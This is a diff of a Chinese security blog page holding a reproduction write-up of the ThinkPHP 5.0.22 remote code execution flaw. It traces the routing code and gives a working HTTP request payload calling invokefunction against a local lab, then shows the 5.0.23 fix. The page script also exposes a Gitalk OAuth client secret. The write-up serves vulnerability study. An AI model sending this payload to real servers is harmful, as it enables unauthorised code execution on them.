@@ -6,17 +6,28 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://sn1per-ssd.github.io">
-  <title>Category: 代码审计 | Sn1pEr&#39;s blog</title>
+  <title>thinkphp5022RCE复现 | Sn1pEr&#39;s blog</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Sn1pEr&#39;s blog">
-<meta property="og:url" content="https://sn1per-ssd.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+  <meta name="description" content="经典老洞，一直没有复现过，趁现在闲着，回味经典。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="thinkphp5022RCE复现">
+<meta property="og:url" content="https://sn1per-ssd.github.io/2022/07/26/thinkphp5022RCE%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="Sn1pEr&#39;s blog">
+<meta property="og:description" content="经典老洞，一直没有复现过，趁现在闲着，回味经典。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sn1per-ssd.github.io/2022/07/26/thinkphp5022RCE%E5%A4%8D%E7%8E%B0/images-202207252212.png">
+<meta property="og:image" content="https://sn1per-ssd.github.io/2022/07/26/thinkphp5022RCE%E5%A4%8D%E7%8E%B0/images-202207252210.png">
+<meta property="og:image" content="https://sn1per-ssd.github.io/2022/07/26/thinkphp5022RCE%E5%A4%8D%E7%8E%B0/images-202207252333.png">
+<meta property="og:image" content="https://sn1per-ssd.github.io/2022/07/26/thinkphp5022RCE%E5%A4%8D%E7%8E%B0/images-202207252351.png">
+<meta property="article:published_time" content="2022-07-25T16:16:00.000Z">
+<meta property="article:modified_time" content="2022-07-25T16:18:24.629Z">
 <meta property="article:author" content="Sn1pEr">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="代码审计">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sn1per-ssd.github.io/2022/07/26/thinkphp5022RCE%E5%A4%8D%E7%8E%B0/images-202207252212.png">
   
     <link rel="alternative" href="/atom.xml" title="Sn1pEr&#39;s blog" type="application/atom+xml">
   
@@ -203,80 +214,283 @@ var _hmt = _hmt || [];
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-thinkphp5022RCE复现" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
   
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2022" class="archive-year">2022</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-<a href="/2022/07/21/thinkphp5022RCE%E5%88%86%E6%9E%90/" class="archive-article-date">
-        <time datetime="2022-07-21T13:56:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-07-21</time>
-</a>
-
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-	
-	  <a class="archive-article-title" href="/2022/07/21/thinkphp5022RCE%E5%88%86%E6%9E%90/">“thinkphp5022RCE分析“</a>
-	
+    <h1 class="article-title" itemprop="name">
+      thinkphp5022RCE复现
     </h1>
   
 
 
-        <div class="article-info info-on-right">
+  
+  
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
+<a href="/2022/07/26/thinkphp5022RCE%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
+        <time datetime="2022-07-25T16:16:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-07-26</time>
+</a>
+
+  
+  
+    
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">921字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">3分</span>
+    </span>
+  </span>
+</div>
+
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>经典老洞，一直没有复现过，趁现在闲着，回味经典。</p>
+<a id="more"></a>
+
+<p>环境：</p>
+<p>xdebug helper（浏览器插件）</p>
+<p>phpstorm</p>
+<p>php7.2（开启xdebug）</p>
+<p><a target="_blank" rel="noopener" href="https://www.thinkphp.cn/donate/download/id/1260.html">thinkphp5.0.22</a></p>
+<p>MAMP</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>由于ThinkPHP是一个很经典的MVC结构，即模型、视图、控制器。这种结构的CMS（如PHPCMS）通俗理解就是可以通过参数来访问不同文件夹下的不同文件，然后实例化对应文件的类并对其进行调用，而在这其中，最重要的就是控制器。通过调用不同的控制器类可以做到不同的功能，而审计该结构相对来说也比较简单，首先是搞清楚如何通过参数调用控制器（即路由），然后是看控制器。</p>
+<p>了解了MVC结构之后再来说说ThinkPHP，ThinkPHP5.0.22是通过参数s来实现的，而参数中是通过路由来进行调用相应的类的，所以首先得大致了解它的路由是如何运行的。</p>
+<h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><p>首先是查看路由。这个有三种方法，一种是从开头插断点嗯跟代码跟过去（牛一点也可以大概看一看代码然后人脑+PHPstorm的快捷键跟过去），另一种就是通过改参数匹配框架下对应的文件夹，找到对应文件夹后就基本了解了大概运行方式，第三种是看开发文档之类的文件来了解如何进行开发。</p>
+<p>在thinkphp中，比较好找跟着代码很块就能找到，在<code>thinkphp/library/think/App.php</code>下。在617行的<code>routeCheck</code>函数中对路由进行检查</p>
+<p><img src="./images-202207252212.png"></p>
+<p>首先它会检测是否开启路由，开启后读取缓存的路由，如果没读取到缓存的路由信息则会导入配置文件中的路由并将路由储存在<code>$rules</code>中，然后对路由进行检测，若路由无效则会进入<code>Route::parseUrl</code>中对其进行切割。之后一路跟进，在route.php的parseUrl中，有这么一个操作：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$bind</span>[<span class="string">&#x27;module&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$bind</span> = str_replace(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$depr</span>, <span class="built_in">self</span>::<span class="variable">$bind</span>[<span class="string">&#x27;module&#x27;</span>]);</span><br><span class="line">        <span class="comment">// 如果有模块/控制器绑定</span></span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$bind</span> . (<span class="string">&#x27;.&#x27;</span> != substr(<span class="variable">$bind</span>, <span class="number">-1</span>) ? <span class="variable">$depr</span> : <span class="string">&#x27;&#x27;</span>) . ltrim(<span class="variable">$url</span>, <span class="variable">$depr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$url</span>              = str_replace(<span class="variable">$depr</span>, <span class="string">&#x27;|&#x27;</span>, <span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$path</span>, <span class="variable">$var</span>) = <span class="built_in">self</span>::parseUrlPath(<span class="variable">$url</span>);</span><br><span class="line">    <span class="variable">$route</span>            = [<span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">    <span class="comment">// 解析模块代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="./images-202207252210.png"></p>
+<p>可以看到，它将<code>index/\think\app/invokefunction</code>替换成了<code>index|\think\app|invokefunction</code>，再用<code>self::parseUrlPath</code>进行了切割之后直接当成了模块、控制器等，最后在1263行封装成为路由。</p>
+<p>在图里我们可以看到模块为<code>index</code>，控制器为<code>\thinkphp\app</code>，函数为<code>invokefunction</code></p>
+<p><img src="./images-202207252333.png"></p>
+<p>最后在<code>thinkphp/library/think/App.php</code>下的445行exec函数一路向下进入494行的<code>module</code>函数，在其中通过获取控制器名和函数名且没有任何过滤，最终执行控制器下的指定函数。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>其实已经没什么好说的了</p>
+<p>通过<code>thinkphp/library/think/App.php</code>中的<code>invokeFunction</code>函数，可以通过反射实例化任意函数。加上上面说的控制路由执行任意函数。只要利用<code>/</code>将模型、控制器、函数分开，然后再将参数传入即可。</p>
+<p>最终payload如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/public/?s=index/\think\app/invokefunction&amp;function=phpinfo&amp;vars[0]=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.thinkphp5022.com:8888</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>XDEBUG_SESSION=XDEBUG_ECLIPSE; PHPSESSID=dr7sbponiagmgo0qjq5qv22q7c</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>最后看看从5.0.22到5.0.23如何进行了防御：</p>
+<p>它在设置控制器的位置进行了正则匹配：</p>
+<p><img src="./images-202207252351.png"></p>
+
+    
+
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          Sn1pEr
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="https://sn1per-ssd.github.io/2022/07/26/thinkphp5022RCE复现/" title="thinkphp5022RCE复现" target="_blank">https://sn1per-ssd.github.io/2022/07/26/thinkphp5022RCE复现/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞复现</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">thinkPHP</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+    
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/代码审计//" class="article-tag-list-link color5">代码审计</a>
+        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
         		</li>
       		
 		</ul>
 	</div>
 
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
+    
 
     
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://sn1per-ssd.github.io/2022/07/26/thinkphp5022RCE%E5%A4%8D%E7%8E%B0/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2022/03/19/hexo%E6%96%B0%E6%89%8B%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">hexo新手使用指北</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1"><span class="toc-number">1.1.</span> <span class="toc-text">路由</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">1.3.</span> <span class="toc-text">防御</span></a></li></ol></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
+
+
+
+
+
+
+
+
+  <div id="gitalk-container" style="padding: 0px 30px 0px 30px;"></div> 
+
+<link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/gitalk/1.7.0/gitalk.css">
+<script src="https://cdn.bootcdn.net/ajax/libs/gitalk/1.7.0/gitalk.min.js"></script>
+<script type="text/javascript">
+
+if(true){
+	var gitalk = new Gitalk({
+  	clientID: 'aa4b4451b3c3cf5c9d80',
+  	clientSecret: '6e89799af07ac80e892a2244ae940e450d29c85c',
+  	repo: 'gitalk',
+  	owner: 'Sn1pEr-ssd',
+  	admin: ['Sn1pEr-ssd'],
+  	id: 'Tue Jul 26 2022 00:16:00 GMT+0800',
+  	distractionFreeMode: 'true'
+})
+gitalk.render('gitalk-container') 
+}
+</script>
+
+
+
+
+
+
+
 
 
           </div>
@@ -317,10 +531,10 @@ var _hmt = _hmt || [];
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
-		isCategory: true,
+		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
 		root: "/",
@@ -409,10 +623,6 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">OGNL</a>
               </li>
              
@@ -426,6 +636,10 @@ var _hmt = _hmt || [];
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -449,11 +663,11 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">提权</a>
+                <a href="javascript:void(0)" class="js-tag color5">nmap</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">nmap</a>
+                <a href="javascript:void(0)" class="js-tag color3">提权</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -470,6 +684,18 @@ var _hmt = _hmt || [];
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">phpstorm</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">xdebug</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">phpstudy</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -497,19 +723,11 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">tips</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">phpstorm</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">xdebug</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">phpstudy</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -518,10 +736,6 @@ var _hmt = _hmt || [];
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">端口号</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -537,15 +751,11 @@ var _hmt = _hmt || [];
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">面试题</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">exp</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">thinkPHP</a>
+                <a href="javascript:void(0)" class="js-tag color4">面试题</a>
               </li>
             
             <div class="clearfix"></div>
